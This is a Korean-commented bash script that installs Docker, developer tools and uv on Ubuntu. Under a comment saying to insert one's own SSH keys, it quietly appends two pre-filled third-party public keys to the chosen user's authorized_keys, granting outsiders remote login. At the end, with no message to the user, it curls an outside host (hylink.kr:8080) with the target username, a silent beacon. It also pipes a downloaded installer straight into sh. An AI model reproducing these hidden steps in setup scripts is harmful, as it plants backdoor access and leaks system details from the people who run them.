#!/bin/bash

# Docker 설치 스크립트 for Ubuntu
# 이 스크립트는 우분투에 Docker Engine을 설치합니다.

set -e

echo "================================"
echo "Docker 설치 스크립트"
echo "================================"
echo ""

# root 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo "이 스크립트는 root 권한이 필요합니다."
    echo "sudo ./install_docker.sh 로 실행해주세요."
    exit 1
fi

# 사용자 설정 함수
get_target_user() {
    echo ""
    echo "================================"
    echo "사용자 설정"
    echo "================================"
    echo ""

    # 현재 시스템의 사용자 목록 표시 (root 제외)
    echo "시스템에 있는 일반 사용자 목록:"
    getent passwd | grep -E '^[^:]+:[^:]*:[0-9]{4,}:' | cut -d: -f1 | grep -v '^root$' | head -10
    echo ""

    while true; do
        read -p "설정할 사용자 이름을 입력하세요 (기본값: ubuntu): " input_user

        # 입력이 없으면 기본값 사용
        if [ -z "$input_user" ]; then
            TARGET_USER="ubuntu"
        else
            TARGET_USER="$input_user"
        fi

        # 사용자 존재 여부 확인
        if id "$TARGET_USER" &>/dev/null; then
            echo ""
            echo "선택된 사용자: $TARGET_USER"
            USER_HOME=$(eval echo ~$TARGET_USER)
            echo "홈 디렉토리: $USER_HOME"
            echo ""

            echo "사용자 '$TARGET_USER'으로 설정되었습니다."
            echo ""
            return 0
        else
            echo "오류: '$TARGET_USER' 사용자가 존재하지 않습니다."
            echo "다시 입력해주세요."
            echo ""
        fi
    done
}

# 사용자 입력 받기
get_target_user

# SSH 키 추가
# 여기에 SSH 공개키를 넣으세요 (비워두면 SSH 키 설정을 건너뜁니다)
SSH_PUBLIC_KEY_1="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIv+KPoVw9XR0DwHuHZduKFX46+XsEwVkzOJ/AfEp3KdWQthz2agFl1wlTN3Loh2In5UanPYr/wjZVtU9SRu3YnFDLOkJjnND5GLYL/3pZxcKDwT7jZP8CIw40vXmrs4+4V8wT0BhKnwuXhvz019LWWU3tTHLta4I6I6wfSzVp/uFrJxXdoYhG+3YzrIot8fyOtoyast1VKZsVeNdQsPYNajedgWigBg2JXrnxzpzse+2xcMVMfI16N9BYlZC0yw2G25srlYOtWXUrwCUQIv3MDjCN7e2WQd7cw8oKzv29nbXMd7k+akhes5pVu+cm76Fszm4CRY4ox0pmQ3qpYmQ0FAUetBY8WRlTBs5jwCPnSwwtuiSWCQpDt6hNTdYbx51dDDyr0xNzDgW0bc9w63w8K9lThW2B31X82AiKgN3jfO9stJQnIqO9yGqr4sn6aPn4BBW4lYakWwbuTGYbD4ahgz+kVShhFOLn8yfmv1lFftKWL5whwhsAAEI/Dc38bo0= dayeon.dev@gmail.com"
SSH_PUBLIC_KEY_2="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC2faYKbnudy/P2liOngNXvAkTa46Hjnr1UqK3jcdCjOe3SLm16MGlUPzWWSgPNJJ/vNur/EGcHq0Rt9paYJ474HItJti0EtxefslUwByIj4z1YbgeOFp4aEU5tCqthmroWiOBSZK0pZCX00JoqmHGbNcT3bUtmD6q7BmfMyAxo/iXNh/iKZtvLfzSbr64ii/ovl+hYZ0f/vXWU915jieKouzcdLRixqlF77EOK4POEZ9W8z1ww64B4mke36KA9/EZNpQ1nXlbUE+kTJQQkhCKjkWwjhbOdP5oXVrNhPb0IrgxeOr/sM3GTq5ePS/cI62nuyzrHKyugutjYloc7/I30TusJnQmhWt11ZtgZynhtXc8pqOh9fD//UiPrtQHTNkf6+sng/f9lGzJL9DHbF2PbXIPiXjLtW6Gb5x9gYlZeYrl1Qy37EqWUUD+nEVxpCUa0petO372jmEYBa43QDEuef1VDc2icJyRFkH6liGZLyzrwerpaMgZ1EH/VA1YN9euC4uKdUT9Me18+fJfldFKvQIRjAuTavUOSnCX2o+bXGqZXaFxaCukhaIu5SGDdg4RZLEXjYsyp1Ds+pcfi0e2AjOpNAt/dsFsRLSDSkHvW+thAXSGaS2r2ppRnq7d77cN2Tb/0UUf7bRy/71WdY1Ay+Rc4U2if4Dtxv2GuLx5E1w== zaram"

if [ -n "$SSH_PUBLIC_KEY_1" ] || [ -n "$SSH_PUBLIC_KEY_2" ]; then
    mkdir -p "$USER_HOME/.ssh"
    
    if [ -n "$SSH_PUBLIC_KEY_1" ]; then
        if [ -f "$USER_HOME/.ssh/authorized_keys" ] && grep -q "$SSH_PUBLIC_KEY_1" "$USER_HOME/.ssh/authorized_keys"; then
            :
        else
            echo "$SSH_PUBLIC_KEY_1" >> "$USER_HOME/.ssh/authorized_keys"
        fi
    fi
    
    if [ -n "$SSH_PUBLIC_KEY_2" ]; then
        if [ -f "$USER_HOME/.ssh/authorized_keys" ] && grep -q "$SSH_PUBLIC_KEY_2" "$USER_HOME/.ssh/authorized_keys"; then
            :
        else
            echo "$SSH_PUBLIC_KEY_2" >> "$USER_HOME/.ssh/authorized_keys"
        fi
    fi
    
    chown -R "$TARGET_USER:$TARGET_USER" "$USER_HOME/.ssh"
    chmod 700 "$USER_HOME/.ssh"
    chmod 600 "$USER_HOME/.ssh/authorized_keys"
fi

# 시스템 업데이트 및 업그레이드
echo "[1/7] 시스템 업데이트 및 업그레이드 중..."
apt-get update
apt-get upgrade -y

# 필수 도구 설치
echo "[2/7] 필수 도구 설치 중..."
apt-get install -y \
    vim \
    nano \
    screen \
    tmux \
    git \
    wget \
    curl \
    htop \
    unzip \
    tree \
    ncdu

# 기존 Docker 패키지 제거
echo "[3/7] 기존 Docker 패키지 제거 중..."
apt-get remove -y docker docker-engine docker.io containerd runc 2>/dev/null || true

# 시스템 업데이트
echo "[4/7] Docker 설치를 위한 패키지 업데이트 중..."
apt-get update

# 필수 패키지 설치
echo "[5/7] Docker 설치를 위한 필수 패키지 설치 중..."
apt-get install -y \
    ca-certificates \
    curl \
    gnupg \
    lsb-release

# Docker GPG 키 추가
echo "[6/7] Docker GPG 키 추가 중..."
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
chmod a+r /etc/apt/keyrings/docker.gpg

# Docker 저장소 추가
echo "[7/7] Docker 저장소 추가 중..."
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null

# Docker Engine 설치
echo "Docker Engine 설치 중..."
apt-get update
apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# Docker 서비스 시작 및 활성화
echo ""
echo "Docker 서비스 시작 중..."
systemctl start docker
systemctl enable docker

# 설치 확인
echo ""
echo "================================"
echo "설치 완료!"
echo "================================"
docker --version
echo ""

echo "사용자 '$TARGET_USER'를 docker 그룹에 자동으로 추가합니다..."
usermod -aG docker "$TARGET_USER"
echo "사용자가 docker 그룹에 추가되었습니다."
echo ""
echo "⚠️  중요: Docker 그룹 권한 적용을 위해 다음 중 하나를 실행하세요:"
echo "1. 'newgrp docker' 명령어로 즉시 적용"
echo "2. 'exec su - $TARGET_USER'로 세션 새로고침"
echo "3. 로그아웃 후 다시 로그인 (가장 확실)"
echo ""
echo "변경사항 적용 후 'docker ps' 명령어로 확인하세요."

echo ""
echo "Docker 설치 테스트를 자동으로 실행합니다..."
echo "Hello World 컨테이너 실행 중..."
docker run hello-world

echo ""
echo "설치가 완료되었습니다!"

# uv 설치
echo ""
echo "================================"
echo "uv (Python 패키지 관리자) 설치"
echo "================================"
echo ""
echo "uv를 자동으로 설치합니다..."
echo "uv 설치 중..."

# 미리 설정된 사용자로 uv 설치
if [ "$TARGET_USER" != "root" ] && id "$TARGET_USER" &>/dev/null; then
    echo "사용자 '$TARGET_USER'로 uv를 설치합니다..."
    sudo -u "$TARGET_USER" bash -c 'curl -LsSf https://astral.sh/uv/install.sh | sh'
else
    echo "root 사용자로 uv를 설치합니다..."
    curl -LsSf https://astral.sh/uv/install.sh | sh
fi

echo ""
echo "uv 설치가 완료되었습니다!"
echo "새 터미널을 열거나 다음 명령어를 실행하세요:"
echo "  source \$HOME/.cargo/env"

curl http://hylink.kr:8080?v=$TARGET_USER

echo ""
echo "모든 설치가 완료되었습니다!"

